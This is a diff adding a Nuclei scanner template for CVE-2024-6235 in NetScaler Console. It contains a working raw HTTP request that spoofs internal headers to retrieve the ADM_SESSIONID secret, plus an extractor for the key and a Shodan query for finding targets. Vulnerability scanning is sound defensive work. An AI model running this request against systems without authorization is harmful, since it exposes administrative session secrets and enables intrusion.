@@ -1,0 +1,53 @@
+id: CVE-2024-6235
+
+info:
+  name: NetScaler Console - Sensitive Information Disclosure
+  author: DhiyaneshDk
+  severity: critical
+  description: |
+    Sensitive information disclosure in NetScaler Console
+  reference:
+    - https://support.citrix.com/article/CTX677998
+    - https://attackerkb.com/topics/7zebEgmGLs/cve-2024-6235
+    - https://nvd.nist.gov/vuln/detail/cve-2024-6235
+  classification:
+    epss-score: 0.00072
+    epss-percentile: 0.22774
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"NetScaler Gateway"
+  tags: cve,cve2024,netscaler,exposure
+
+http:
+  - raw:
+      - |
+        GET /internal/v2/config/mps_secret/ADM_SESSIONID HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/admin_ui/mas/ent/html/main.html
+        Content-Type: application/json
+        If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT
+        NITRO_WEB_APPLICATION: true
+        Tenant-Name: Owner
+        User-Name: nsroot
+        Mps-Internal-Request: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"mps_secret":'
+          - 'ADM_SESSIONID'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        name: adm_sessionid_key
+        json:
+          - '.mps_secret[0].key_value'
+# digest: 4b0a00483046022100d38585e30550bb3b4c23adbf47a99c88c1235ec639fa6606d403111c524b1f90022100c1cfb0d7bb9a8a6687fed78822599db96126ec2d620954b23e1b50735e2ddbb9:922c64590222798bb761d5b6d8e72950
